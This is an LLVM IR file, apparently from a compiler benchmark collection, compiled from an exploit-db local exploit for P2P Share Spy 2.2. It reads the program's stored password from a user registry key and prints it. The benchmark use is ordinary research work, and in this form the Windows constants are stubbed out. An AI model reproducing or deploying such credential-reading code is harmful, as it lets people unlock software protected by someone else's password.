; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/windows/local/extr_920.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/windows/local/extr_920.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@HKEY_CURRENT_USER = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [60 x i8] c"Software\\VB and VBA Program Settings\\P2P Share Spy\\Settings\00", align 1
@KEY_QUERY_VALUE = common dso_local global i32 0, align 4
@hKey = common dso_local global i32 0, align 4
@ERROR_SUCCESS = common dso_local global i64 0, align 8
@.str.1 = private unnamed_addr constant [12 x i8] c"txtPassword\00", align 1
@Password = common dso_local global i8* null, align 8
@dwBufLen = common dso_local global i64 0, align 8
@lRet = common dso_local global i64 0, align 8
@BUFSIZE = common dso_local global i64 0, align 8
@.str.2 = private unnamed_addr constant [11 x i8] c"Not found!\00", align 1
@.str.3 = private unnamed_addr constant [42 x i8] c"P2P Share Spy 2.2 Local Exploit by Kozan\0A\00", align 1
@.str.4 = private unnamed_addr constant [19 x i8] c"Credits to ATmaCA\0A\00", align 1
@.str.5 = private unnamed_addr constant [48 x i8] c"www.netmagister.com  -  www.spyinstructors.com\0A\00", align 1
@.str.6 = private unnamed_addr constant [24 x i8] c"kozan@netmagister.com\0A\0A\00", align 1
@.str.7 = private unnamed_addr constant [31 x i8] c"Program Opening Password : %s\0A\00", align 1
@.str.8 = private unnamed_addr constant [52 x i8] c"P2P Share Spy 2.2 is not installed on your system!\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main() #0 {
  %1 = alloca i32, align 4
  store i32 0, i32* %1, align 4
  %2 = load i32, i32* @HKEY_CURRENT_USER, align 4
  %3 = load i32, i32* @KEY_QUERY_VALUE, align 4
  %4 = call i64 @RegOpenKeyEx(i32 %2, i8* getelementptr inbounds ([60 x i8], [60 x i8]* @.str, i64 0, i64 0), i32 0, i32 %3, i32* @hKey)
  %5 = load i64, i64* @ERROR_SUCCESS, align 8
  %6 = icmp eq i64 %4, %5
  br i1 %6, label %7, label %32

7:                                                ; preds = %0
  %8 = load i32, i32* @hKey, align 4
  %9 = load i8*, i8** @Password, align 8
  %10 = ptrtoint i8* %9 to i32
  %11 = call i64 @RegQueryValueEx(i32 %8, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.1, i64 0, i64 0), i32* null, i32* null, i32 %10, i64* @dwBufLen)
  store i64 %11, i64* @lRet, align 8
  %12 = load i64, i64* @lRet, align 8
  %13 = load i64, i64* @ERROR_SUCCESS, align 8
  %14 = icmp ne i64 %12, %13
  br i1 %14, label %19, label %15

15:                                               ; preds = %7
  %16 = load i64, i64* @dwBufLen, align 8
  %17 = load i64, i64* @BUFSIZE, align 8
  %18 = icmp sgt i64 %16, %17
  br i1 %18, label %19, label %23

19:                                               ; preds = %15, %7
  %20 = load i32, i32* @hKey, align 4
  %21 = call i32 @RegCloseKey(i32 %20)
  %22 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.2, i64 0, i64 0))
  store i32 0, i32* %1, align 4
  br label %35

23:                                               ; preds = %15
  %24 = load i32, i32* @hKey, align 4
  %25 = call i32 @RegCloseKey(i32 %24)
  %26 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([42 x i8], [42 x i8]* @.str.3, i64 0, i64 0))
  %27 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([19 x i8], [19 x i8]* @.str.4, i64 0, i64 0))
  %28 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([48 x i8], [48 x i8]* @.str.5, i64 0, i64 0))
  %29 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.6, i64 0, i64 0))
  %30 = load i8*, i8** @Password, align 8
  %31 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([31 x i8], [31 x i8]* @.str.7, i64 0, i64 0), i8* %30)
  br label %34

32:                                               ; preds = %0
  %33 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([52 x i8], [52 x i8]* @.str.8, i64 0, i64 0))
  br label %34

34:                                               ; preds = %32, %23
  store i32 0, i32* %1, align 4
  br label %35

35:                                               ; preds = %34, %19
  %36 = load i32, i32* %1, align 4
  ret i32 %36
}

declare dso_local i64 @RegOpenKeyEx(i32, i8*, i32, i32, i32*) #1

declare dso_local i64 @RegQueryValueEx(i32, i8*, i32*, i32*, i32, i64*) #1

declare dso_local i32 @RegCloseKey(i32) #1

declare dso_local i32 @printf(i8*, ...) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
